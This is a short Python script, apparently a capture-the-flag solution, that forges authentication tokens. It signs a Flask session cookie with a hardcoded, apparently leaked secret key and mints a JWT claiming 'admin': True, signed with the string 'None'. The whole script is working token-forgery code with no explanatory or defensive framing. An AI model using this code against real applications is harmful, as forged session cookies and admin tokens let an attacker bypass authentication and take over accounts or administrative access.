from itsdangerous import URLSafeTimedSerializer
from flask import Flask, session
from flask.json.tag import TaggedJSONSerializer
import json
import jwt
import hashlib

def generate_session_cookie(secret_key, session_data):
    serializer = URLSafeTimedSerializer(secret_key,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1}
    )
    
    session_cookie = serializer.dumps(session_data)
    return session_cookie

# Example usage
secret_key = 'p+u2Mvm>JWD:k{bj]F_BY}'
session_data = {'uuid': 'Invalid uuid'}

# Generate the session cookie
cookie = generate_session_cookie(secret_key, session_data)
print("Generated Session Cookie:", cookie)

key = "None"
payload = {
    'admin': True
}
generated_jwt = jwt.encode(payload, key, algorithm='HS256') 

print("Generated JWT:", generated_jwt)


